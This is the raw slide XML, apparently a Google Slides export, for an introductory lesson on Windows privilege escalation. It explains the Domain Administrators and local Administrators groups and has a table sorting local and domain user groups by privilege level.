            <a:lstStyle/>
            <a:p>
              <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                <a:spcBef>
                  <a:spcPts val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="800"/>
                </a:spcAft>
                <a:buClr>
                  <a:srgbClr val="000000"/>
                </a:buClr>
                <a:buSzPts val="1100"/>
                <a:buFont typeface="Arial"/>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en">
                  <a:solidFill>
                    <a:schemeClr val="dk2"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>NOTE</a:t>
              </a:r>
              <a:endParaRPr b="1">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="757" name="Google Shape;757;p92"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6345375" y="2467325"/>
              <a:ext cx="2254500" cy="723000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="lt2"/>
            </a:solidFill>
            <a:ln>
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="137150" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="45700">
              <a:noAutofit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                <a:spcBef>
                  <a:spcPts val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en">
                  <a:solidFill>
                    <a:schemeClr val="dk2"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>This is considered a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high-privilege group.</a:t>
              </a:r>
              <a:endParaRPr b="1">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="758" name="Google Shape;758;p92"/>
            <p:cNvPicPr preferRelativeResize="0"/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId4">
              <a:alphaModFix/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6326863" y="1445725"/>
              <a:ext cx="928274" cy="928274"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln>
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>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62" name="Shape 762"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="763" name="Google Shape;763;p93"/>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Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="764" name="Google Shape;764;p93"/>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765" name="Google Shape;765;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8813400" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>We’re particularly interested in two groups:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="766" name="Google Shape;766;p93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1102800" y="1445375"/>
            <a:ext cx="3202500" cy="4767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767" name="Google Shape;767;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990525" y="2156750"/>
            <a:ext cx="3314700" cy="1621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This group has very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high privileges in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Active Directory.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>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This lets the user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modify group policies, create users, set permissions, etc.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="768" name="Google Shape;768;p93"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4259150" y="1335450"/>
            <a:ext cx="827475" cy="3106474"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="769" name="Google Shape;769;p93"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="457147" y="1433528"/>
            <a:ext cx="533372" cy="533480"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="695400" cy="695450"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="770" name="Google Shape;770;p93"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="6213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i="0" lang="en" sz="2100" u="none" cap="none" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>01</a:t>
              </a:r>
              <a:endParaRPr i="0" sz="2100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="771" name="Google Shape;771;p93"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="634726" y="1885638"/>
              <a:ext cx="340325" cy="188625"/>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a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="772" name="Google Shape;772;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1176342" y="1482220"/>
            <a:ext cx="29739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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Domain Administrators</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="773" name="Google Shape;773;p93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5539775" y="1445375"/>
            <a:ext cx="3202500" cy="4767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774" name="Google Shape;774;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5613317" y="1482220"/>
            <a:ext cx="29739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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Administrators</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="775" name="Google Shape;775;p93"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4876797" y="1433528"/>
            <a:ext cx="533372" cy="533480"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="695400" cy="695450"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="776" name="Google Shape;776;p93"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="621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i="0" lang="en" sz="2100" u="none" cap="none" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>02</a:t>
              </a:r>
              <a:endParaRPr i="0" sz="2100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="777" name="Google Shape;777;p93"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="634726" y="1885638"/>
              <a:ext cx="34032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a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="778" name="Google Shape;778;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5410175" y="2156750"/>
            <a:ext cx="3564000" cy="2200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The local group for administrators</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>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On a local Windows 10 machine, this lets the user create new local users, assign them to local groups, reset passwords, etc.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>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2" name="Shape 782"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="783" name="Google Shape;783;p94"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="784" name="Google Shape;784;p94"/>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785" name="Google Shape;785;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8813400" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Four types of user groups:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="786" name="Google Shape;786;p94"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="575775" y="1282438"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{6612969B-C513-441B-A60A-CB1CB7D8F428}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1902775"/>
                <a:gridCol w="2990475"/>
                <a:gridCol w="3099200"/>
              </a:tblGrid>
              <a:tr h="548600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:t/>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk1"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto Medium"/>
                        <a:ea typeface="Roboto Medium"/>
                        <a:cs typeface="Roboto Medium"/>
                        <a:sym typeface="Roboto Medium"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="91425"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tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Local</a:t>
                      </a:r>
                      <a:endParaRPr b="1" sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="91425" marL="91425" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="19050">
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="19050">
                      <a:solidFill>
                        <a:srgbClr val="78909C"/>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tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Domain</a:t>
                      </a:r>
                      <a:endParaRPr b="1" sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="91425" marL="91425" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="19050">
                      <a:solidFill>
                        <a:srgbClr val="78909C"/>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tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="1316975">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:schemeClr val="dk1"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Low Privilege</a:t>
                      </a:r>
                      <a:endParaRPr b="1" sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="274300"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78909C"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="lt1"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Users</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="91425"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1475D4"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="lt1"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Domain users</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="91425"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43461"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="1356300">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:schemeClr val="dk1"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>High Privilege</a:t>
                      </a:r>
                      <a:endParaRPr b="1" sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="91425" marR="274300"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78909C"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="19050">
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Administrators</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="548625" marR="91425" marL="91425" anchor="b">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accent1"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
